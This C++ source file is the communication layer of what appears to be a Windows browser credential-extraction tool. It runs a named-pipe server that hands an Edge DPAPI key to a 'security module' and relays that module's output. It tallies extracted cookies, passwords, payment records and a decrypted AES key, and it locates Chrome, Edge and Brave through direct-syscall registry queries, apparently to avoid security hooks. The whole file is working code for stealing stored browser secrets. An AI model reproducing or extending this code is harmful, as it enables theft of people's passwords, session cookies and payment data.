// CommunicationLayer.cpp - Console and pipe communication implementation
#include "CommunicationLayer.h"
#include "RuntimeSupport.h"
#include "syscalls.h"
#include <ShlObj.h>
#include <Rpc.h>

#pragma comment(lib, "Rpcrt4.lib")

constexpr DWORD MODULE_COMPLETION_TIMEOUT_MS = 60000;
constexpr DWORD DATABASE_READY_TIMEOUT_MS = 30000;
constexpr DWORD PIPE_POLL_INTERVAL_MS = 10;
constexpr const char* DATABASE_READY_SIGNAL = "__DB_READY__";
constexpr const char* DATABASE_READY_ACK = "DB_READY_ACK";
constexpr const char* MODULE_COMPLETION_SIGNAL = "__DLL_PIPE_COMPLETION_SIGNAL__";

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Utility function implementations
namespace Utils
{
    std::string path_to_api_string(std::wstring_view path)
    {
        return kvc::text::WideToUtf8(path);
    }
    
    std::wstring GetLocalAppDataPath()
    {
        PWSTR path = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
        {
            std::wstring result = path;
            CoTaskMemFree(path);
            return result;
        }
        return {};
    }

    std::string WStringToUtf8(std::wstring_view w_sv)
    {
        return kvc::text::WideToUtf8(w_sv);
    }

    std::string PtrToHexStr(const void* ptr) noexcept
    {
        std::string result;
        kvc::text::AppendHex(result, reinterpret_cast<uintptr_t>(ptr), true);
        return result;
    }

    std::string NtStatusToString(NTSTATUS status) noexcept
    {
        std::string result;
        kvc::text::AppendHex(result, static_cast<std::uint32_t>(status), true);
        return result;
    }

    std::wstring GenerateUniquePipeName()
    {
        UUID uuid;
        UuidCreate(&uuid);
        wchar_t* uuidStrRaw = nullptr;
        UuidToStringW(&uuid, (RPC_WSTR*)&uuidStrRaw);
        std::wstring pipeName = L"\\\\.\\pipe\\";
        if (uuidStrRaw)
            pipeName.append(uuidStrRaw);
        RpcStringFreeW((RPC_WSTR*)&uuidStrRaw);
        return pipeName;
    }

    std::string Capitalize(const std::string& str)
    {
        if (str.empty()) return str;
        std::string result = str;
        if (result[0] >= 'a' && result[0] <= 'z')
            result[0] = static_cast<char>(result[0] - ('a' - 'A'));
        return result;
    }
}

// Console implementation
Console::Console(bool verbose) : m_verbose(verbose), m_hConsole(GetStdHandle(STD_OUTPUT_HANDLE))
{
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    GetConsoleScreenBufferInfo(m_hConsole, &consoleInfo);
    m_originalAttributes = consoleInfo.wAttributes;
}

void Console::Info(const std::string& msg) const { print("[*]", msg, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
void Console::Success(const std::string& msg) const { print("[+]", msg, FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
void Console::Error(const std::string& msg) const { print("[-]", msg, FOREGROUND_RED | FOREGROUND_INTENSITY); }
void Console::Warn(const std::string& msg) const { print("[!]", msg, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }

void Console::Debug(const std::string& msg) const
{
    if (m_verbose)
        print("[#]", msg, FOREGROUND_RED | FOREGROUND_GREEN);
}

void Console::Relay(const std::string& message) const
{
    size_t tagStart = message.find('[');
    size_t tagEnd = message.find(']', tagStart);
    
    if (tagStart != std::string::npos && tagEnd != std::string::npos)
    {
        kvc::console::WriteUtf8(m_hConsole, std::string_view(message).substr(0, tagStart));
        std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);

        WORD color = m_originalAttributes;
        if (tag == "[+]") color = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
        else if (tag == "[-]") color = FOREGROUND_RED | FOREGROUND_INTENSITY;
        else if (tag == "[*]") color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
        else if (tag == "[!]") color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

        SetColor(color);
        kvc::console::WriteUtf8(m_hConsole, tag);
        ResetColor();
        kvc::console::WriteUtf8(m_hConsole, std::string_view(message).substr(tagEnd + 1));
        kvc::console::WriteUtf8(m_hConsole, "\n");
    }
    else
    {
        kvc::console::WriteUtf8(m_hConsole, message);
        kvc::console::WriteUtf8(m_hConsole, "\n");
    }
}

void Console::print(const std::string& tag, const std::string& msg, WORD color) const
{
    SetColor(color);
    kvc::console::WriteUtf8(m_hConsole, tag);
    ResetColor();
    kvc::console::WriteUtf8(m_hConsole, " ");
    kvc::console::WriteUtf8(m_hConsole, msg);
    kvc::console::WriteUtf8(m_hConsole, "\n");
}

void Console::BlankLine() const
{
    kvc::console::WriteUtf8(m_hConsole, "\n");
}

void Console::SetColor(WORD attributes) const noexcept { SetConsoleTextAttribute(m_hConsole, attributes); }
void Console::ResetColor() const noexcept { SetConsoleTextAttribute(m_hConsole, m_originalAttributes); }

// PipeCommunicator implementation
PipeCommunicator::PipeCommunicator(const std::wstring& pipeName, const Console& console) 
    : m_pipeName(pipeName), m_console(console) {}

bool PipeCommunicator::create(std::string& error)
{
    HANDLE pipe = CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                   PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                   1, 65536, 65536, 0, nullptr);
    if (pipe == INVALID_HANDLE_VALUE)
    {
        error = "CreateNamedPipeW failed. Error: ";
        kvc::text::AppendUnsigned(error, GetLastError());
        return false;
    }
    m_pipeHandle.reset(pipe);

    m_console.Debug("Named pipe server created: " + Utils::WStringToUtf8(m_pipeName));
    return true;
}

bool PipeCommunicator::waitForClient(std::string& error)
{
    m_console.Debug("Waiting for security module to connect to named pipe.");
    if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        error = "ConnectNamedPipe failed. Error: ";
        kvc::text::AppendUnsigned(error, GetLastError());
        return false;
    }

    m_console.Debug("Security module connected to named pipe.");
    return true;
}

bool PipeCommunicator::sendInitialData(bool isVerbose, std::wstring_view outputPath,
                                       const std::vector<uint8_t>& edgeDpapiKey,
                                       std::string& error)
{
    if (!writeMessage(isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE", error))
        return false;
    if (!writeMessage(Utils::path_to_api_string(outputPath), error))
        return false;
    
    // Send DPAPI key as hex string (or "NONE" if empty)
    if (!edgeDpapiKey.empty())
    {
        std::string key;
        key.reserve(10 + edgeDpapiKey.size() * 2);
        key.append("DPAPI_KEY:");
        for (uint8_t byte : edgeDpapiKey)
            kvc::text::AppendUnsigned(key, byte, 16, 2);
        return writeMessage(key, error);
    }
    return writeMessage("DPAPI_KEY:NONE", error);
}

bool PipeCommunicator::waitForDatabaseReady(std::string& error)
{
    m_console.Debug("Waiting for security module to decrypt its database key.");
    const DWORD startTime = GetTickCount();

    while (GetTickCount() - startTime < DATABASE_READY_TIMEOUT_MS)
    {
        const DWORD elapsed = GetTickCount() - startTime;
        const DWORD remaining = elapsed < DATABASE_READY_TIMEOUT_MS
                                    ? DATABASE_READY_TIMEOUT_MS - elapsed
                                    : 0;
        std::string message;
        bool timedOut = false;
        if (!readMessage(message, remaining, error, timedOut))
        {
            if (timedOut)
                error = "Timed out waiting for database-ready signal.";
            if (!error.empty())
                m_console.Error(error);
            return false;
        }

        if (message == DATABASE_READY_SIGNAL)
        {
            m_console.Debug("Security module is ready for database access.");
            return true;
        }

        if (message == MODULE_COMPLETION_SIGNAL)
        {
            error = "Security module ended before requesting database access.";
            m_console.Error(error);
            return false;
        }

        parseExtractionMessage(message);
        if (!message.empty())
            m_console.Relay(message);
    }

    error = "Timed out waiting for database-ready signal.";
    m_console.Error(error);
    return false;
}

bool PipeCommunicator::acknowledgeDatabaseReady(std::string& error)
{
    if (!writeMessage(DATABASE_READY_ACK, error))
        return false;
    m_console.Debug("Security module released to open browser databases.");
    return true;
}

void PipeCommunicator::relayMessages()
{
    m_console.Debug("Waiting for security module execution. (Pipe: " +
                    Utils::WStringToUtf8(m_pipeName) + ")");

    m_console.BlankLine();

    const DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime < MODULE_COMPLETION_TIMEOUT_MS)
    {
        const DWORD elapsed = GetTickCount() - startTime;
        const DWORD remaining = elapsed < MODULE_COMPLETION_TIMEOUT_MS
                                    ? MODULE_COMPLETION_TIMEOUT_MS - elapsed
                                    : 0;
        std::string message;
        std::string error;
        bool timedOut = false;
        if (!readMessage(message, remaining, error, timedOut))
        {
            if (!timedOut && !error.empty())
                m_console.Error(error);
            break;
        }

        if (message == MODULE_COMPLETION_SIGNAL)
        {
            m_console.Debug("Security module completion signal received.");
            break;
        }

        parseExtractionMessage(message);
        if (!message.empty())
            m_console.Relay(message);
    }

    m_console.BlankLine();
    m_console.Debug("Security module signaled completion or pipe interaction ended.");
}

bool PipeCommunicator::readMessage(std::string& message, DWORD timeoutMs,
                                   std::string& error, bool& timedOut)
{
    timedOut = false;
    const DWORD startTime = GetTickCount();

    for (;;)
    {
        DWORD bytesAvailable = 0;
        if (!PeekNamedPipe(m_pipeHandle.get(), nullptr, 0, nullptr,
                           &bytesAvailable, nullptr))
        {
            if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                error = "Security module closed the pipe.";
                return false;
            }

            error = "PeekNamedPipe failed. Error: ";
            kvc::text::AppendUnsigned(error, GetLastError());
            return false;
        }

        if (bytesAvailable > 0)
        {
            std::vector<char> buffer(bytesAvailable);
            DWORD bytesRead = 0;
            if (!ReadFile(m_pipeHandle.get(), buffer.data(), bytesAvailable,
                          &bytesRead, nullptr) || bytesRead == 0)
            {
                error = "ReadFile from pipe failed. Error: ";
                kvc::text::AppendUnsigned(error, GetLastError());
                return false;
            }

            message.assign(buffer.data(), bytesRead);
            if (!message.empty() && message.back() == '\0')
                message.pop_back();
            return true;
        }

        if (GetTickCount() - startTime >= timeoutMs)
        {
            timedOut = true;
            return false;
        }

        Sleep(PIPE_POLL_INTERVAL_MS);
    }
}

bool PipeCommunicator::writeMessage(const std::string& msg, std::string& error)
{
    DWORD bytesWritten = 0;
    if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
        bytesWritten != (msg.length() + 1))
    {
        error = "WriteFile to pipe failed. Error: ";
        kvc::text::AppendUnsigned(error, GetLastError());
        return false;
    }

    FlushFileBuffers(m_pipeHandle.get());

    m_console.Debug("Sent message to pipe: " + msg);
    return true;
}

void PipeCommunicator::parseExtractionMessage(const std::string& message)
{
    auto extractNumber = [&message](const std::string& prefix, const std::string& suffix) -> int
    {
        size_t start = message.find(prefix);
        if (start == std::string::npos) return 0;
        start += prefix.length();
        size_t end = message.find(suffix, start);
        if (end == std::string::npos) return 0;
        
        int value = 0;
        return kvc::text::ParseInt(std::string_view(message).substr(start, end - start), value)
                   ? value
                   : 0;
    };

    if (message.find("Found ") != std::string::npos && message.find("profile(s)") != std::string::npos)
        m_stats.profileCount = extractNumber("Found ", " profile(s)");

    if (message.find("Decrypted AES Key: ") != std::string::npos)
        m_stats.aesKey = message.substr(message.find("Decrypted AES Key: ") + 19);

    if (message.find(" cookies extracted to ") != std::string::npos)
        m_stats.totalCookies += extractNumber("[*] ", " cookies");

    if (message.find(" passwords extracted to ") != std::string::npos)
        m_stats.totalPasswords += extractNumber("[*] ", " passwords");

    if (message.find(" payments extracted to ") != std::string::npos)
        m_stats.totalPayments += extractNumber("[*] ", " payments");
}

// BrowserPathResolver implementation
BrowserPathResolver::BrowserPathResolver(const Console& console) : m_console(console) {}

std::wstring BrowserPathResolver::resolve(const std::wstring& browserExeName)
{
    m_console.Debug("Searching Registry for: " + Utils::WStringToUtf8(browserExeName));

    const std::wstring registryPaths[] = {
        L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName,
        L"\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName
    };

    for (const auto& regPath : registryPaths)
    {
        std::wstring path = queryRegistryDefaultValue(regPath);
        if (!path.empty() && kvc::paths::FileExists(path))
        {
            m_console.Debug("Found at: " + Utils::WStringToUtf8(path));
            return path;
        }
    }

    m_console.Debug("Not found in Registry");
    return L"";
}

std::vector<std::pair<std::wstring, std::wstring>> BrowserPathResolver::findAllInstalledBrowsers()
{
    std::vector<std::pair<std::wstring, std::wstring>> installedBrowsers;

    const std::pair<std::wstring, std::wstring> supportedBrowsers[] = {
        {L"chrome", L"chrome.exe"},
        {L"edge", L"msedge.exe"},
        {L"brave", L"brave.exe"}
    };

    m_console.Debug("Enumerating installed browsers...");

    for (const auto& [browserType, exeName] : supportedBrowsers)
    {
        std::wstring path = resolve(exeName);
        if (!path.empty())
        {
            installedBrowsers.push_back({browserType, path});
            m_console.Debug("Found " + Utils::Capitalize(Utils::WStringToUtf8(browserType)) + 
                          " at: " + Utils::WStringToUtf8(path));
        }
    }

    if (installedBrowsers.empty())
    {
        m_console.Warn("No supported browsers found installed on this system");
    }
    else
    {
        std::string message = "Found ";
        kvc::text::AppendUnsigned(message, installedBrowsers.size());
        message.append(" browser(s) to process");
        m_console.Debug(message);
    }

    return installedBrowsers;
}

std::wstring BrowserPathResolver::queryRegistryDefaultValue(const std::wstring& keyPath)
{
    std::vector<wchar_t> pathBuffer(keyPath.begin(), keyPath.end());
    pathBuffer.push_back(L'\0');

    UNICODE_STRING_SYSCALLS keyName;
    keyName.Buffer = pathBuffer.data();
    keyName.Length = static_cast<USHORT>(keyPath.length() * sizeof(wchar_t));
    keyName.MaximumLength = static_cast<USHORT>(pathBuffer.size() * sizeof(wchar_t));

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HANDLE hKey = nullptr;
    NTSTATUS status = NtOpenKey_syscall(&hKey, KEY_READ, &objAttr);

    if (!NT_SUCCESS(status))
    {
        if (status != (NTSTATUS)0xC0000034) // STATUS_OBJECT_NAME_NOT_FOUND
            m_console.Debug("Registry access failed: " + Utils::NtStatusToString(status));
        return L"";
    }

    // RAII guard for key handle
    struct KeyGuard {
        HANDLE h;
        ~KeyGuard() { if (h) NtClose_syscall(h); }
    } keyGuard{hKey};

    UNICODE_STRING_SYSCALLS valueName = {0, 0, nullptr};
    ULONG bufferSize = 4096;
    std::vector<BYTE> buffer(bufferSize);
    ULONG resultLength = 0;

    status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
                                   buffer.data(), bufferSize, &resultLength);
    
    if (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_BUFFER_OVERFLOW)
    {
        buffer.resize(resultLength);
        bufferSize = resultLength;
        status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
                                       buffer.data(), bufferSize, &resultLength);
    }

    if (!NT_SUCCESS(status))
        return L"";

    auto kvpi = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buffer.data());

    if (kvpi->Type != REG_SZ && kvpi->Type != REG_EXPAND_SZ)
        return L"";
    if (kvpi->DataLength < sizeof(wchar_t) * 2)
        return L"";

    size_t charCount = kvpi->DataLength / sizeof(wchar_t);
    std::wstring path(reinterpret_cast<wchar_t*>(kvpi->Data), charCount);
    
    while (!path.empty() && path.back() == L'\0')
        path.pop_back();

    if (path.empty())
        return L"";

    if (kvpi->Type == REG_EXPAND_SZ)
    {
        std::vector<wchar_t> expanded(MAX_PATH * 2);
        DWORD size = ExpandEnvironmentStringsW(path.c_str(), expanded.data(), 
                                             static_cast<DWORD>(expanded.size()));
        if (size > 0 && size <= expanded.size())
            path = std::wstring(expanded.data());
    }

    return path;
}
